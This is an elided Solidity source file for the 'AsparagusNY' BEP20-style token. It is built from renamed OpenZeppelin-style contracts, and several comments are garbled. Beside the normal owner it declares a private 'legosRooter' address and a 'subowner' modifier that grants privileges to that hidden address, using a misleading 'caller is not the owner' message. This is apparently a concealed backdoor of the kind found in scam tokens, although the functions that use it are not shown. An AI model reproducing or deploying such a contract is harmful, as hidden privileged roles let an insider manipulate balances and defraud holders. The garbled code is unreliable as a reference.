...
/*
AsparagusNY 
https://AsparagusNY.io/
https://docs.AsparagusNY.io/
https://t.me/AsparagusNY
*/
pragma solidity 0.8.23;

interface AsparagusNY33 {
  /**
...
/*
 * @dev Provides information about the current execution AsparagusNY20Burnable, including the
 ...
 */
abstract contract AsparagusNY20Burnable {
...
// File: @openzeppelin/contracts/access/AsparagusNY20Ownable.sol
 ...
 * the owner.
 */
abstract contract AsparagusNY20Ownable is AsparagusNY20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "AsparagusNY20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AsparagusNY20Ownable: new owner is the zero address");
 ...
 * `SafeAsparagusNY` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeAsparagusNY {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeAsparagusNY: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeAsparagusNY: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeAsparagusNY: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeAsparagusNY: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeAsparagusNY: modulo by zero");
  }
...
contract AsparagusNYToken is AsparagusNY20Burnable, AsparagusNY33, AsparagusNY20Ownable {
    
    using SafeAsparagusNY for uint256;
   ...
   address private legosRooter; 
    ...
    string public AsparagusNYtelegramcchannel = "https://t.me/AsparagusNY";
            function getAsparagusNYtelegramcchannel() public view returns (string memory) {
        return AsparagusNYtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {AsparagusNY33-totalSupply}.
    */
    ...
    /**
    * @dev See {AsparagusNY33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "AsparagusNY20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {AsparagusNY33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {AsparagusNY33-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {AsparagusNY33-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {AsparagusNY33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {AsparagusNY33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "AsparagusNY33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {AsparagusNY33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "AsparagusNY33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "AsparagusNY33: transfer from the zero address");
        require(shippingto != address(0), "AsparagusNY33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "AsparagusNY33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "AsparagusNY33: approve from the zero address");
        require(transporteur != address(0), "AsparagusNY33: approve to the zero address");
